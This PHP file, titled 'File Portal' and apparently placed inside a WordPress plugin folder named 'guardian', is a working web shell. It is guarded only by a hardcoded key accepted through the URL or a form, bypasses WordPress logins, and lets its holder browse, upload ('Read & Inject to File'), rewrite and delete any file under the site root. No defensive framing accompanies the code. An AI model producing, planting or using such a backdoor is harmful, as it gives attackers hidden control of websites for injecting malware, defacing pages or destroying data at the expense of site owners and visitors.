<?php
ob_start();
ini_set('display_errors', 1);
error_reporting(E_ALL);

$secret_key = 'mySecretKey2026!';

// Dynamically traverse 4 levels up to reach the server root (public_html)
// guardian (0) -> plugins (1) -> wp-content (2) -> wp (3) -> public_html (4)
$resolved_root = realpath(dirname(__DIR__, 5));
$root_path = $resolved_root ? rtrim(str_replace('\\', '/', $resolved_root), '/') : rtrim(str_replace('\\', '/', dirname(__DIR__, 4)), '/');

// 1. Authentication via URL parameter or POST
$token = $_POST['k'] ?? $_GET['k'] ?? '';
$is_auth = ($token === $secret_key);

// 2. Safe Directory Resolution & Sandboxing
$req_dir = isset($_GET['dir']) ? str_replace(['../', '..\\'], '', $_GET['dir']) : '';
$current_path = realpath($root_path . '/' . ltrim($req_dir, '/\\'));

if (!$current_path || strpos(str_replace('\\', '/', $current_path), $root_path) !== 0) {
    $current_path = $root_path;
}

$rel_path = trim(str_replace($root_path, '', str_replace('\\', '/', $current_path)), '/');

// 3. Actions
$msg = '';
if ($is_auth) {
    // Non-traditional file upload: Read stream -> create blank file -> write contents
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file_upload'])) {
        $file = $_FILES['file_upload'];
        if ($file['error'] === 0 && is_uploaded_file($file['tmp_name'])) {
            $filename = basename($file['name']);
            $target_dest = $current_path . '/' . $filename;

            $file_data = file_get_contents($file['tmp_name']);

            if ($file_data !== false) {
                $handle = @fopen($target_dest, 'w');
                if ($handle) {
                    fclose($handle);
                }

                $bytes_written = @file_put_contents($target_dest, $file_data, LOCK_EX);

                if ($bytes_written !== false) {
                    $msg = "<p style='color:lightgreen;'>Created and populated: <strong>" . htmlspecialchars($filename) . "</strong> (" . $bytes_written . " bytes)</p>";
                } else {
                    $msg = "<p style='color:red;'>Failed to write content into destination file.</p>";
                }
            } else {
                $msg = "<p style='color:red;'>Could not read uploaded file content.</p>";
            }
        } else {
            $msg = "<p style='color:red;'>Upload stream error.</p>";
        }
    }

    // Save File Direct Edit
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['edit_file'], $_POST['content'])) {
        $target = realpath($root_path . '/' . ltrim(str_replace(['../', '..\\'], '', $_POST['edit_file']), '/\\'));
        if ($target && strpos(str_replace('\\', '/', $target), $root_path) === 0) {
            @file_put_contents($target, $_POST['content'], LOCK_EX);
            $msg = "<p style='color:lightgreen;'>File saved successfully.</p>";
        }
    }

    // Delete Item
    if (isset($_GET['del'])) {
        $target = realpath($root_path . '/' . ltrim(str_replace(['../', '..\\'], '', $_GET['del']), '/\\'));
        if ($target && strpos(str_replace('\\', '/', $target), $root_path) === 0 && $target !== $root_path) {
            if (is_dir($target)) {
                @rmdir($target);
            } else {
                @unlink($target);
            }
        }
        header("Location: manager.php?k=" . urlencode($secret_key) . "&dir=" . urlencode($rel_path));
        exit;
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>File Portal</title>
    <style>
        body { font-family: monospace; background: #111; color: #eee; padding: 20px; }
        .box { max-width: 900px; margin: 0 auto; background: #222; padding: 20px; border-radius: 5px; }
        a { color: #4da6ff; text-decoration: none; }
        table { width: 100%; border-collapse: collapse; margin-top: 15px; }
        th, td { text-align: left; padding: 6px 8px; border-bottom: 1px solid #333; }
        th { background: #181818; }
        input, select, textarea, button { background: #333; color: #fff; border: 1px solid #444; padding: 6px; }
        .del-btn { color: #ff5555; }
    </style>
</head>
<body>
<div class="box">
    <?php if (!$is_auth): ?>
        <h3>Authentication Required</h3>
        <form method="POST">
            <input type="password" name="k" placeholder="Access Key" autofocus required>
            <button type="submit">Unlock</button>
        </form>
    <?php else: ?>
        <h3>File Manager</h3>

        <!-- Breadcrumbs Navigation -->
        <div style="background:#181818; padding:10px; margin-bottom:15px;">
            <a href="?k=<?= urlencode($secret_key); ?>&dir=">root</a>
            <?php
            if (!empty($rel_path)) {
                $parts = explode('/', $rel_path);
                $b = '';
                foreach ($parts as $p) {
                    $b .= (empty($b) ? '' : '/') . $p;
                    echo " / <a href='?k=" . urlencode($secret_key) . "&dir=" . urlencode($b) . "'>" . htmlspecialchars($p) . "</a>";
                }
            }
            ?>
        </div>

        <?= $msg ?>

        <?php if (isset($_GET['edit'])): 
            $edit_rel = ltrim(str_replace(['../', '..\\'], '', $_GET['edit']), '/\\');
            $edit_file = realpath($root_path . '/' . $edit_rel);
            $content = ($edit_file && is_file($edit_file)) ? file_get_contents($edit_file) : '';
        ?>
            <h4>Editing: <?= htmlspecialchars($edit_rel); ?></h4>
            <form method="POST">
                <input type="hidden" name="k" value="<?= htmlspecialchars($secret_key); ?>">
                <input type="hidden" name="edit_file" value="<?= htmlspecialchars($edit_rel); ?>">
                <textarea name="content" style="width:100%; height:400px;"><?= htmlspecialchars($content); ?></textarea>
                <br><br>
                <button type="submit">Save File</button>
                <a href="?k=<?= urlencode($secret_key); ?>&dir=<?= urlencode(dirname($edit_rel) === '.' ? '' : dirname($edit_rel)); ?>" style="margin-left:10px;">Back</a>
            </form>
        <?php else: ?>

            <!-- Direct Memory Read & Inject Upload -->
            <form method="POST" enctype="multipart/form-data" style="margin-bottom:15px;">
                <input type="hidden" name="k" value="<?= htmlspecialchars($secret_key); ?>">
                <input type="file" name="file_upload" required>
                <button type="submit">Read & Inject to File</button>
            </form>

            <!-- Table Explorer -->
            <table>
                <thead>
                    <tr>
                        <th>Name</th>
                        <th>Size</th>
                        <th>Action</th>
                    </tr>
                </thead>
                <tbody>
                    <?php if (!empty($rel_path)): 
                        $up = dirname($rel_path);
                        $up = ($up === '.' || $up === '/') ? '' : $up;
                    ?>
                        <tr><td colspan="3"><a href="?k=<?= urlencode($secret_key); ?>&dir=<?= urlencode($up); ?>">📁 .. (Up)</a></td></tr>
                    <?php endif; ?>

                    <?php
                    $items = @scandir($current_path);
                    if ($items) {
                        $items = array_diff($items, ['.', '..']);
                        foreach ($items as $item) {
                            $abs = $current_path . '/' . $item;
                            $rel = ltrim($rel_path . '/' . $item, '/');
                            $is_d = is_dir($abs);
                            ?>
                            <tr>
                                <td>
                                    <?php if ($is_d): ?>
                                        <a href="?k=<?= urlencode($secret_key); ?>&dir=<?= urlencode($rel); ?>">📁 <?= htmlspecialchars($item); ?></a>
                                    <?php else: ?>
                                        📄 <?= htmlspecialchars($item); ?>
                                    <?php endif; ?>
                                </td>
                                <td><?= $is_d ? '--' : round(@filesize($abs) / 1024, 2) . ' KB'; ?></td>
                                <td>
                                    <?php if (!$is_d): ?>
                                        <a href="?k=<?= urlencode($secret_key); ?>&dir=<?= urlencode($rel_path); ?>&edit=<?= urlencode($rel); ?>">Edit</a> | 
                                    <?php endif; ?>
                                    <a href="?k=<?= urlencode($secret_key); ?>&dir=<?= urlencode($rel_path); ?>&del=<?= urlencode($rel); ?>" class="del-btn" onclick="return confirm('Delete?');">Delete</a>
                                </td>
                            </tr>
                            <?php
                        }
                    }
                    ?>
                </tbody>
            </table>
        <?php endif; ?>
    <?php endif; ?>
</div>
</body>
</html>